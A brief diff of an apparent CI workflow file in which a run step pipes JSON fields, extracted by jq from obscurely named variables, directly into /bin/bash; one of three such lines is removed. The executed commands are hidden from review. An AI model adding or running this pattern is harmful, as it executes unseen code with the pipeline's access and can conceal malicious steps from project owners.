@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$tns255" | jq -r .ev08601 | /bin/bash
           printf '%s' "$w3" | jq -r .ubil58468 | /bin/bash
-          echo $kbnqv7154 | jq -r .bge88 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
